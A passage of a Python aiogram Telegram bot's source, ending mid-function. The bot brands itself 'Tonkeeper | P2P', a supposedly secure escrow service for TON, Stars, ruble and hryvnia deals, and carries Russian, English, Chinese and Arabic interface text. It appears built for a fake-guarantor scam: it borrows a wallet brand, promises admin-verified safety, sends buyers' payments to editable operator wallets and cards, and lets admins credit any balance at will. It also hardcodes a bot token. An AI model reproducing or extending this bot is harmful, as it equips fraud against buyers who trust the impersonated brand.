import asyncio
import json
import os
import uuid
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties

# ========== КОНФИГ ==========
BOT_TOKEN = "8854837097:AAGWRVj4xW3WVh8xIk1iB50QuClmhA_dxCg"
MASTER_ADMIN_ID = 8002472821
SUPPORT_LINK = "@p2psuptokeeperbot"
BOT_USERNAME = "tonkeeperdialbot"
BOT_NAME = "Tonkeeper | P2P"
CHANNEL_LINK = "https://t.me/tonkeeper_ru"

# ========== ПОДДЕРЖИВАЕМЫЕ ЯЗЫКИ ==========
LANGUAGES = {
    "ru": "🇷🇺 Русский",
    "en": "🇬🇧 English",
    "zh": "🇨🇳 中文",
    "ar": "🇸🇦 العربية"
}

# ========== ПРЕМИУМ ЭМОДЗИ (ВСЕ ID ИЗ ТВОИХ СПИСКОВ) ==========
P = {
    "🔥": "5208513917965328345",
    "❤️": "5208806229144524155",
    "💎": "5316583751923290826",
    "💰": "5208954744818651087",
    "⭐️": "5208446474093876113",
    "✨": "5208424793098968198",
    "✅": "5208422125924275090",
    "❌": "5208480322731137426",
    "❓": "5208739588431957814",
    "❗️": "5208431570557360595",
    "⚠️": "5206371334875012678",
    "➕": "5208964052012780755",
    "➖": "5208583212967680239",
    "➡️": "5319187743350217782",
    "◀️": "5316635411789931847",
    "⬆️": "5316991155341125587",
    "⬇️": "5317005105394901648",
    "👑": "5316716234484506715",
    "👤": "5206193858236406745",
    "👍": "5208822833488091726",
    "👎": "5208933295751977679",
    "📱": "5208752434679142939",
    "📊": "5208846279714560254",
    "📦": "5208752434679142939",
    "📝": "5208752434679142939",
    "📌": "5208548453797352937",
    "🔗": "5208730126619005798",
    "🔒": "5208876722442753552",
    "🔔": "5208964052012780755",
    "🔙": "5316635411789931847",
    "🔽": "5317005105394901648",
    "💳": "5316583751923290826",
    "💬": "5296258510684712098",
    "💲": "5208497914917179963",
    "💱": "5208929984332191234",
    "🏆": "5208479459442708955",
    "🏴‍☠️": "5316995828265538844",
    "🎁": "5235695112419303615",
    "🔧": "5208694736088488348",
    "⚙️": "5208694736088488348",
    "🖼": "5203977968644288289",
    "📷": "5373056919688731596",
    "✏️": "5301173701323028420",
    "⌛": "5318940267334622539",
    "⏳": "5318940267334622539",
    "🚀": "5258332798409783582",
    "✈️": "5208619118894273325",
    "🌐": "5208773063407066255",
    "🪙": "5316583751923290826",
    "👛": "5316583751923290826",
    "🐶": "5433776470080107054",
    "🐱": "5246792792516082598",
    "🐈": "5316847239576970469",
    "🐆": "5316824802667813116",
    "🤖": "5197252827247841976",
    "🥷": "5206338766138007521",
    "👻": "5208581293117298225",
    "💀": "5318857718063192007",
    "🦖": "5318852478203091165",
    "🕷": "5208813534883897052",
    "🕸": "5208805254186948298",
    "🌈": "5206493268996546666",
    "⭐": "5208446474093876113",
    "🌟": "5208938110410314809",
    "💫": "5208957270259425030",
    "💯": "5319168016565424610",
    "‼️": "5319183916534354992",
    "⁉️": "5206298861596861762",
    "0️⃣": "5206375917605119584",
    "1️⃣": "5208967788634331369",
    "2️⃣": "5208451293047182923",
    "3️⃣": "5208944947998249032",
    "4️⃣": "5208834721957564558",
    "5️⃣": "5208576293775364525",
    "6️⃣": "5208663374237292374",
    "7️⃣": "5208837848693779350",
    "8️⃣": "5208548647070881692",
    "9️⃣": "5208420442297094974",
    "📉": "5208497914917179963",
    "📞": "5208764937328940427",
    "⏰": "5208481478077338787",
    "📢": "5208572771902182077",
    "🆘": "5206186324863769699",
    "🔍": "5206531640234368505",
    "📭": "5208739588431957814",
    "👇": "5317005105394901648",
    "🔐": "5208876722442753552",
    "🛡️": "5316898985342952232",
    "🤝": "5206472897966660789",
    "📋": "5208846279714560254",
    "⚡️": "5206186324863769699",
    "🔑": "5316583751923290826",
    "🏠": "5305757775752620395",
}


def pm(emoji_char: str) -> str:
    emoji_id = P.get(emoji_char)
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>'
    return emoji_char


def premium_button(text: str, callback_data: str, emoji_char: str = None) -> InlineKeyboardButton:
    if emoji_char and emoji_char in P:
        return InlineKeyboardButton(
            text=text,
            icon_custom_emoji_id=P[emoji_char],
            callback_data=callback_data
        )
    return InlineKeyboardButton(text=text, callback_data=callback_data)


bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ========== ФАЙЛЫ ==========
DEALS_FILE = "deals.json"
ADMINS_FILE = "admins.json"
BALANCE_FILE = "balance.json"
REKVISITS_FILE = "rekvisits.json"
START_PHOTO_FILE = "start_photo.json"
WITHDRAW_REQUESTS_FILE = "withdraw_requests.json"
USER_LANGUAGE_FILE = "user_language.json"


def load_deals():
    if os.path.exists(DEALS_FILE):
        with open(DEALS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}


def save_deals(deals):
    with open(DEALS_FILE, 'w', encoding='utf-8') as f:
        json.dump(deals, f, indent=2, ensure_ascii=False)


def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
            return set(json.load(f))
    return {MASTER_ADMIN_ID}


def save_admins(admins):
    with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(list(admins), f, indent=2)


def load_balance():
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}


def save_balance(balance):
    with open(BALANCE_FILE, 'w', encoding='utf-8') as f:
        json.dump(balance, f, indent=2, ensure_ascii=False)


def load_rekvisits():
    if os.path.exists(REKVISITS_FILE):
        with open(REKVISITS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {
        "ton": f"{pm('💎')} ОПЛАТА TON\n\nПереведите TON на кошелек:\nUQCD3wX5Y5G5d8F5J8K9L0Z1X2C3V4B5N6M7A8S9D0F1G2H3\n\nСумма: {{amount}} TON",
        "stars": f"{pm('⭐️')} ОПЛАТА ЗВЁЗДАМИ\n\nОтправьте звёзды в бота: @{BOT_USERNAME}\n\nСумма: {{amount}} STARS",
        "rub": f"{pm('💰')} ОПЛАТА РУБЛЯМИ\n\nПереведите на карту:\n2200 1234 5678 9012\nТинькофф\n\nСумма: {{amount}} RUB",
        "uah": f"{pm('🌐')} ОПЛАТА ГРИВНАМИ\n\nПереведите на карту:\n4149 5678 1234 5678\nПриватБанк\n\nСумма: {{amount}} UAH"
    }


def save_rekvisits(rekvisits):
    with open(REKVISITS_FILE, 'w', encoding='utf-8') as f:
        json.dump(rekvisits, f, indent=2, ensure_ascii=False)


def load_start_photo():
    if os.path.exists(START_PHOTO_FILE):
        with open(START_PHOTO_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"file_id": None}


def save_start_photo(data):
    with open(START_PHOTO_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)


def load_withdraw_requests():
    if os.path.exists(WITHDRAW_REQUESTS_FILE):
        with open(WITHDRAW_REQUESTS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}


def save_withdraw_requests(requests):
    with open(WITHDRAW_REQUESTS_FILE, 'w', encoding='utf-8') as f:
        json.dump(requests, f, indent=2, ensure_ascii=False)


def load_user_language():
    if os.path.exists(USER_LANGUAGE_FILE):
        with open(USER_LANGUAGE_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}


def save_user_language(lang_data):
    with open(USER_LANGUAGE_FILE, 'w', encoding='utf-8') as f:
        json.dump(lang_data, f, indent=2, ensure_ascii=False)


deals = load_deals()
admins = load_admins()
balance = load_balance()
rekvisits = load_rekvisits()
start_photo = load_start_photo()
withdraw_requests = load_withdraw_requests()
user_language = load_user_language()


# ========== ЛОКАЛИЗАЦИЯ ==========
LOCALE = {
    "ru": {
        "bot_name": "Tonkeeper | P2P",
        "safe_deals": "БЕЗОПАСНЫЕ P2P-СДЕЛКИ",
        "feature1": "Честные сделки между продавцами и покупателями",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Гарант безопасности с обеих сторон",
        "feature4": "Премиум поддержка 24/7",
        "how_it_works": "КАК ЭТО РАБОТАЕТ",
        "step1": "Продавец создаёт сделку",
        "step2": "Продавец отправляет ссылку покупателю",
        "step3": "Покупатель выбирает способ оплаты",
        "step4": "Администратор проверяет оплату",
        "step5": "Продавец нажимает «Передал товар»",
        "step6": "Покупатель нажимает «Получил товар»",
        "step7": "Деньги зачисляются на баланс продавца",
        "our_channel": "НАШ КАНАЛ",
        "support": "ПОДДЕРЖКА",
        "start_now": "НАЧНИ ПРЯМО СЕЙЧАС",
        "create_deal": "СОЗДАТЬ СДЕЛКУ",
        "my_balance": "МОЙ БАЛАНС",
        "my_deals": "МОИ СДЕЛКИ",
        "premium": "ПРЕМИУМ",
        "faq": "FAQ",
        "channel": "КАНАЛ",
        "admin_panel": "АДМИН ПАНЕЛЬ",
        "choose_action": "ВЫБЕРИТЕ ДЕЙСТВИЕ",
        "describe_product": "ОПИШИТЕ ТОВАР ИЛИ УСЛУГУ, КОТОРУЮ ВЫ ПРОДАЁТЕ",
        "example_product": "ПРИМЕР: NFT-подарок Telegram Premium",
        "choose_currency": "ВЫБЕРИТЕ ВАЛЮТУ СДЕЛКИ",
        "enter_amount": "ВВЕДИТЕ СУММУ СДЕЛКИ (ТОЛЬКО ЧИСЛО)",
        "enter_buyer": "ВВЕДИТЕ TELEGRAM USERNAME ПОКУПАТЕЛЯ (БЕЗ @)",
        "buyer_username_example": "ПРИМЕР: john_doe",
        "only_this_user": "ТОЛЬКО ЭТОТ ПОЛЬЗОВАТЕЛЬ СМОЖЕТ ЗАЙТИ В СДЕЛКУ",
        "deal_created": "СДЕЛКА СОЗДАНА",
        "send_link_to_buyer": "ОТПРАВЬТЕ ЭТУ ССЫЛКУ ПОКУПАТЕЛЮ",
        "your_balance": "ВАШ БАЛАНС",
        "withdraw_funds": "ВЫВЕСТИ СРЕДСТВА",
        "main_menu": "ГЛАВНОЕ МЕНЮ",
        "no_deals": "У ВАС НЕТ СДЕЛОК",
        "your_deals": "ВАШИ СДЕЛКИ",
        "premium_status": "ПРЕМИУМ СТАТУС",
        "premium_privileges": "ПРИВИЛЕГИИ",
        "premium_1": "ПРИОРИТЕТНАЯ ПОДДЕРЖКА 24/7",
        "premium_2": "СНИЖЕННАЯ КОМИССИЯ (0%)",
        "premium_3": "РАННИЙ ДОСТУП К НОВЫМ ФУНКЦИЯМ",
        "premium_4": "ЭКСКЛЮЗИВНЫЕ NFT-НАГРАДЫ",
        "premium_active": "ВАШ СТАТУС: АКТИВЕН (БЕССРОЧНО)",
        "faq_q1": "КАК НАЧАТЬ СДЕЛКУ?",
        "faq_a1": "НАЖМИТЕ «СОЗДАТЬ СДЕЛКУ» И СЛЕДУЙТЕ ИНСТРУКЦИИ.",
        "faq_q2": "КАКИЕ ВАЛЮТЫ ДОСТУПНЫ?",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "КАК Я ПОЛУЧУ ОПЛАТУ?",
        "faq_a3": "ПОСЛЕ ПОДТВЕРЖДЕНИЯ ПОКУПАТЕЛЯ ДЕНЬГИ НА БАЛАНС.",
        "faq_q4": "КАК ВЫВЕСТИ ДЕНЬГИ?",
        "faq_a4": "«МОЙ БАЛАНС» → ВЫБРАТЬ ВАЛЮТУ → УКАЗАТЬ РЕКВИЗИТЫ",
        "faq_q5": "БЕЗОПАСНО ЛИ ЭТО?",
        "faq_a5": "ДА! АДМИНИСТРАТОР ПРОВЕРЯЕТ ОПЛАТУ.",
        "faq_q6": "СКОЛЬКО ВРЕМЕНИ ЗАНИМАЕТ ВЫВОД?",
        "faq_a6": "1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ.",
        "faq_q7": "КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?",
        "faq_a7": "НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "invalid_amount": "ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ",
        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
        "waiting_for_payment": "ОЖИДАНИЕ ОПЛАТЫ",
        "paid": "ОПЛАЧЕНО",
        "awaiting_confirmation": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБЕРИТЕ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ!",
        "choose_language_prompt": "🇷🇺🇬🇧🇨🇳🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК, ЧТОБЫ ПРОДОЛЖИТЬ:\n\nSELECT YOUR LANGUAGE TO CONTINUE:\n\n选择您的语言以继续:\n\nاختر لغتك للمتابعة:"
    },
    "en": {
        "bot_name": "Tonkeeper | P2P",
        "safe_deals": "SECURE P2P DEALS",
        "feature1": "Fair deals between sellers and buyers",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Security guarantee from both sides",
        "feature4": "Premium 24/7 support",
        "how_it_works": "HOW IT WORKS",
        "step1": "Seller creates a deal",
        "step2": "Seller sends link to buyer",
        "step3": "Buyer chooses payment method",
        "step4": "Admin verifies payment",
        "step5": "Seller clicks 'Delivered'",
        "step6": "Buyer clicks 'Received'",
        "step7": "Money credited to seller's balance",
        "our_channel": "OUR CHANNEL",
        "support": "SUPPORT",
        "start_now": "START NOW",
        "create_deal": "CREATE DEAL",
        "my_balance": "MY BALANCE",
        "my_deals": "MY DEALS",
        "premium": "PREMIUM",
        "faq": "FAQ",
        "channel": "CHANNEL",
        "admin_panel": "ADMIN PANEL",
        "choose_action": "CHOOSE ACTION",
        "describe_product": "DESCRIBE THE PRODUCT OR SERVICE YOU ARE SELLING",
        "example_product": "EXAMPLE: NFT gift Telegram Premium",
        "choose_currency": "CHOOSE DEAL CURRENCY",
        "enter_amount": "ENTER DEAL AMOUNT (NUMBER ONLY)",
        "enter_buyer": "ENTER BUYER'S TELEGRAM USERNAME (WITHOUT @)",
        "buyer_username_example": "EXAMPLE: john_doe",
        "only_this_user": "ONLY THIS USER CAN ACCESS THE DEAL",
        "deal_created": "DEAL CREATED",
        "send_link_to_buyer": "SEND THIS LINK TO THE BUYER",
        "your_balance": "YOUR BALANCE",
        "withdraw_funds": "WITHDRAW FUNDS",
        "main_menu": "MAIN MENU",
        "no_deals": "YOU HAVE NO DEALS",
        "your_deals": "YOUR DEALS",
        "premium_status": "PREMIUM STATUS",
        "premium_privileges": "PRIVILEGES",
        "premium_1": "PRIORITY 24/7 SUPPORT",
        "premium_2": "REDUCED COMMISSION (0%)",
        "premium_3": "EARLY ACCESS TO NEW FEATURES",
        "premium_4": "EXCLUSIVE NFT REWARDS",
        "premium_active": "YOUR STATUS: ACTIVE (LIFETIME)",
        "faq_q1": "HOW TO START A DEAL?",
        "faq_a1": "CLICK 'CREATE DEAL' AND FOLLOW THE INSTRUCTIONS.",
        "faq_q2": "WHAT CURRENCIES ARE AVAILABLE?",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "HOW DO I RECEIVE PAYMENT?",
        "faq_a3": "AFTER BUYER CONFIRMATION, MONEY GOES TO BALANCE.",
        "faq_q4": "HOW TO WITHDRAW MONEY?",
        "faq_a4": "'MY BALANCE' → SELECT CURRENCY → ENTER DETAILS",
        "faq_q5": "IS IT SAFE?",
        "faq_a5": "YES! ADMIN VERIFIES ALL PAYMENTS.",
        "faq_q6": "HOW LONG DOES WITHDRAWAL TAKE?",
        "faq_a6": "1-5 MINUTES AFTER CONFIRMATION.",
        "faq_q7": "HOW TO CONTACT SUPPORT?",
        "faq_a7": "CLICK 'CHANNEL' BUTTON OR MESSAGE SUPPORT",
        "deal_not_found": "DEAL NOT FOUND OR ALREADY COMPLETED",
        "access_denied": "ACCESS DENIED",
        "invalid_amount": "ENTER A POSITIVE NUMBER",
        "payment_confirmed": "PAYMENT CONFIRMED",
        "seller_confirmed": "YOU CONFIRMED PRODUCT DELIVERY",
        "buyer_confirmed": "YOU CONFIRMED PRODUCT RECEIPT",
        "deal_completed": "DEAL COMPLETED",
        "insufficient_balance": "INSUFFICIENT BALANCE",
        "choose_payment_method": "CHOOSE PAYMENT METHOD",
        "pay_by_rekvisits": "PAY BY DETAILS",
        "pay_by_balance": "PAY FROM BALANCE",
        "waiting_for_payment": "WAITING FOR PAYMENT",
        "paid": "PAID",
        "awaiting_confirmation": "AWAITING CONFIRMATION",
        "completed": "COMPLETED",
        "select_language": "SELECT LANGUAGE",
        "welcome": "WELCOME!",
        "choose_language_prompt": "🇷🇺🇬🇧🇨🇳🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК, ЧТОБЫ ПРОДОЛЖИТЬ:\n\nSELECT YOUR LANGUAGE TO CONTINUE:\n\n选择您的语言以继续:\n\nاختر لغتك للمتابعة:"
    },
    "zh": {
        "bot_name": "Tonkeeper | P2P",
        "safe_deals": "安全P2P交易",
        "feature1": "买卖双方公平交易",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "双方安全保障",
        "feature4": "24/7高级支持",
        "how_it_works": "运作方式",
        "step1": "卖家创建交易",
        "step2": "卖家发送链接给买家",
        "step3": "买家选择支付方式",
        "step4": "管理员验证付款",
        "step5": "卖家点击「已交付」",
        "step6": "买家点击「已收到」",
        "step7": "款项计入卖家余额",
        "our_channel": "我们的频道",
        "support": "支持",
        "start_now": "立即开始",
        "create_deal": "创建交易",
        "my_balance": "我的余额",
        "my_deals": "我的交易",
        "premium": "高级会员",
        "faq": "常见问题",
        "channel": "频道",
        "admin_panel": "管理面板",
        "choose_action": "选择操作",
        "describe_product": "描述您出售的商品或服务",
        "example_product": "示例：NFT礼物 Telegram Premium",
        "choose_currency": "选择交易货币",
        "enter_amount": "输入交易金额（仅数字）",
        "enter_buyer": "输入买家的Telegram用户名（不带@）",
        "buyer_username_example": "示例：john_doe",
        "only_this_user": "只有此用户可以访问交易",
        "deal_created": "交易已创建",
        "send_link_to_buyer": "将此链接发送给买家",
        "your_balance": "您的余额",
        "withdraw_funds": "提取资金",
        "main_menu": "主菜单",
        "no_deals": "您没有任何交易",
        "your_deals": "您的交易",
        "premium_status": "高级会员状态",
        "premium_privileges": "特权",
        "premium_1": "24/7优先支持",
        "premium_2": "降低手续费 (0%)",
        "premium_3": "新功能抢先体验",
        "premium_4": "独家NFT奖励",
        "premium_active": "您的状态：激活（永久）",
        "faq_q1": "如何开始交易？",
        "faq_a1": "点击「创建交易」并按照说明操作。",
        "faq_q2": "支持哪些货币？",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "如何收到付款？",
        "faq_a3": "买家确认后，款项将计入余额。",
        "faq_q4": "如何提现？",
        "faq_a4": "「我的余额」→ 选择货币 → 输入信息",
        "faq_q5": "安全吗？",
        "faq_a5": "是的！管理员验证所有付款。",
        "faq_q6": "提现需要多长时间？",
        "faq_a6": "确认后1-5分钟。",
        "faq_q7": "如何联系支持？",
        "faq_a7": "点击「频道」按钮或联系客服",
        "deal_not_found": "交易未找到或已完成",
        "access_denied": "访问被拒绝",
        "invalid_amount": "输入正数",
        "payment_confirmed": "付款已确认",
        "seller_confirmed": "您已确认交付商品",
        "buyer_confirmed": "您已确认收到商品",
        "deal_completed": "交易已完成",
        "insufficient_balance": "余额不足",
        "choose_payment_method": "选择支付方式",
        "pay_by_rekvisits": "按信息付款",
        "pay_by_balance": "从余额付款",
        "waiting_for_payment": "等待付款",
        "paid": "已付款",
        "awaiting_confirmation": "等待确认",
        "completed": "已完成",
        "select_language": "选择语言",
        "welcome": "欢迎！",
        "choose_language_prompt": "🇷🇺🇬🇧🇨🇳🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК, ЧТОБЫ ПРОДОЛЖИТЬ:\n\nSELECT YOUR LANGUAGE TO CONTINUE:\n\n选择您的语言以继续:\n\nاختر لغتك للمتابعة:"
    },
    "ar": {
        "bot_name": "Tonkeeper | P2P",
        "safe_deals": "صفقات P2P آمنة",
        "feature1": "صفقات عادلة بين البائعين والمشترين",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "ضمان الأمن من كلا الجانبين",
        "feature4": "دعم بريميوم 24/7",
        "how_it_works": "كيف يعمل",
        "step1": "البائع ينشئ صفقة",
        "step2": "البائع يرسل الرابط للمشتري",
        "step3": "المشتري يختار طريقة الدفع",
        "step4": "المدقق يتحقق من الدفع",
        "step5": "البائع يضغط «تم التسليم»",
        "step6": "المشتري يضغط «تم الاستلام»",
        "step7": "تضاف الأموال إلى رصيد البائع",
        "our_channel": "قناتنا",
        "support": "الدعم",
        "start_now": "ابدأ الآن",
        "create_deal": "إنشاء صفقة",
        "my_balance": "رصيدي",
        "my_deals": "صفقاتي",
        "premium": "بريميوم",
        "faq": "أسئلة شائعة",
        "channel": "القناة",
        "admin_panel": "لوحة التحكم",
        "choose_action": "اختر إجراء",
        "describe_product": "وصف المنتج أو الخدمة التي تبيعها",
        "example_product": "مثال: هدية NFT Telegram Premium",
        "choose_currency": "اختر عملة الصفقة",
        "enter_amount": "أدخل مبلغ الصفقة (أرقام فقط)",
        "enter_buyer": "أدخل اسم مستخدم المشتري في تليغرام (بدون @)",
        "buyer_username_example": "مثال: john_doe",
        "only_this_user": "هذا المستخدم فقط يمكنه الوصول إلى الصفقة",
        "deal_created": "تم إنشاء الصفقة",
        "send_link_to_buyer": "أرسل هذا الرابط إلى المشتري",
        "your_balance": "رصيدك",
        "withdraw_funds": "سحب الأموال",
        "main_menu": "القائمة الرئيسية",
        "no_deals": "ليس لديك صفقات",
        "your_deals": "صفقاتك",
        "premium_status": "حالة البريميوم",
        "premium_privileges": "الامتيازات",
        "premium_1": "دعم ذو أولوية 24/7",
        "premium_2": "عمولة مخفضة (0%)",
        "premium_3": "وصول مبكر إلى الميزات الجديدة",
        "premium_4": "مكافآت NFT حصرية",
        "premium_active": "حالتك: نشط (مدى الحياة)",
        "faq_q1": "كيف أبدأ صفقة؟",
        "faq_a1": "اضغط «إنشاء صفقة» واتبع التعليمات.",
        "faq_q2": "ما هي العملات المتاحة؟",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "كيف أتلقى الدفع؟",
        "faq_a3": "بعد تأكيد المشتري، تضاف الأموال إلى الرصيد.",
        "faq_q4": "كيف أسحب الأموال؟",
        "faq_a4": "«رصيدي» → اختر عملة → أدخل التفاصيل",
        "faq_q5": "هل هذا آمن؟",
        "faq_a5": "نعم! المدقق يتحقق من جميع المدفوعات.",
        "faq_q6": "كم يستغرق السحب؟",
        "faq_a6": "1-5 دقائق بعد التأكيد.",
        "faq_q7": "كيف اتصل بالدعم؟",
        "faq_a7": "اضغط زر «القناة» أو أرسل رسالة للدعم",
        "deal_not_found": "الصفقة غير موجودة أو مكتملة بالفعل",
        "access_denied": "الوصول مرفوض",
        "invalid_amount": "أدخل رقماً موجباً",
        "payment_confirmed": "تم تأكيد الدفع",
        "seller_confirmed": "لقد أكدت تسليم المنتج",
        "buyer_confirmed": "لقد أكدت استلام المنتج",
        "deal_completed": "الصفقة مكتملة",
        "insufficient_balance": "رصيد غير كافٍ",
        "choose_payment_method": "اختر طريقة الدفع",
        "pay_by_rekvisits": "الدفع حسب التفاصيل",
        "pay_by_balance": "الدفع من الرصيد",
        "waiting_for_payment": "انتظار الدفع",
        "paid": "تم الدفع",
        "awaiting_confirmation": "انتظار التأكيد",
        "completed": "مكتملة",
        "select_language": "اختر اللغة",
        "welcome": "مرحباً!",
        "choose_language_prompt": "🇷🇺🇬🇧🇨🇳🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК, ЧТОБЫ ПРОДОЛЖИТЬ:\n\nSELECT YOUR LANGUAGE TO CONTINUE:\n\n选择您的语言以继续:\n\nاختر لغتك للمتابعة:"
    }
}


def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)


def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    if uid in user_language:
        return user_language[uid]
    return None  # Возвращаем None, если язык не выбран


def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_user_language(user_language)


def has_language(user_id: int) -> bool:
    return str(user_id) in user_language


# ========== FSM ==========
class DealStates(StatesGroup):
    waiting_for_product = State()
    waiting_for_currency = State()
    waiting_for_amount = State()
    waiting_for_buyer_username = State()


class RekvStates(StatesGroup):
    waiting_for_rekv_type = State()
    waiting_for_rekv_text = State()


class PhotoStates(StatesGroup):
    waiting_for_photo = State()


class WithdrawStates(StatesGroup):
    waiting_for_currency = State()
    waiting_for_details = State()


class AdminAddBalanceState(StatesGroup):
    waiting_for_user_id = State()
    waiting_for_currency = State()
    waiting_for_amount = State()


# ========== КЛАВИАТУРЫ ==========
def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([premium_button(lang_name, f"set_lang_{lang_code}", "🌐")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    buttons = [
        [
            premium_button(get_text(lang, "create_deal"), "menu_create_deal", "📱"),
            premium_button(get_text(lang, "my_balance"), "menu_my_balance", "💰"),
        ],
        [
            premium_button(get_text(lang, "my_deals"), "menu_my_deals", "📊"),
            premium_button(get_text(lang, "premium"), "menu_premium", "⭐️"),
        ],
        [
            premium_button(get_text(lang, "faq"), "menu_faq", "❓"),
            premium_button(get_text(lang, "channel"), "menu_channel", "🔥"),
        ],
        [
            premium_button(get_text(lang, "select_language"), "select_language", "🌐"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            premium_button(get_text(lang, "admin_panel"), "menu_admin_panel", "👑")
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def currency_keyboard(user_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("TON", "curr_TON", "💎")],
        [premium_button("STARS", "curr_STARS", "⭐️")],
        [premium_button("RUB", "curr_RUB", "💰")],
        [premium_button("UAH", "curr_UAH", "🌐")]
    ])


def withdraw_currency_keyboard(user_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("TON", "withdraw_TON", "💎")],
        [premium_button("STARS", "withdraw_STARS", "⭐️")],
        [premium_button("RUB", "withdraw_RUB", "💰")],
        [premium_button("UAH", "withdraw_UAH", "🌐")]
    ])


def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("СМЕНИТЬ СТАРТ ФОТО", "change_photo", "📷")],
        [premium_button("НАЧИСЛИТЬ БАЛАНС", "admin_add_balance", "💰")],
        [premium_button("ДОБАВИТЬ АДМИНА", "add_admin", "🐶")],
        [premium_button("УДАЛИТЬ АДМИНА", "remove_admin", "🐱")],
        [premium_button("СПИСОК АДМИНОВ", "list_admins", "📊")],
        [premium_button("РЕКВИЗИТЫ ОПЛАТЫ", "edit_rekvisits", "💎")],
        [premium_button("ВСЕ СДЕЛКИ", "all_deals", "🏆")],
        [premium_button("ЗАЯВКИ НА ВЫВОД", "withdraw_requests", "💲")],
        [premium_button(get_text(lang, "main_menu"), "back_to_main", "◀️")]
    ])


def rekvisits_edit_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("ИЗМЕНИТЬ TON", "edit_ton", "💎")],
        [premium_button("ИЗМЕНИТЬ STARS", "edit_stars", "⭐️")],
        [premium_button("ИЗМЕНИТЬ RUB", "edit_rub", "💰")],
        [premium_button("ИЗМЕНИТЬ UAH", "edit_uah", "🌐")],
        [premium_button("НАЗАД", "back_to_admin", "◀️")]
    ])


def seller_confirm_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("ПЕРЕДАЛ ТОВАР", f"seller_done_{deal_id}", "📦")]
    ])


def buyer_confirm_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("ПОЛУЧИЛ ТОВАР", f"buyer_confirm_{deal_id}", "👍")],
        [premium_button("В ПОДДЕРЖКУ", f"support_{deal_id}", "❓")]
    ])


def buyer_pending_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("ОЖИДАНИЕ ПЕРЕДАЧИ", "noop", "⏳")],
        [premium_button("В ПОДДЕРЖКУ", f"support_{deal_id}", "❓")]
    ])


def payment_method_keyboard(deal_id, user_id: int):
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button(get_text(lang, "pay_by_rekvisits"), f"pay_rekvisits_{deal_id}", "💳")],
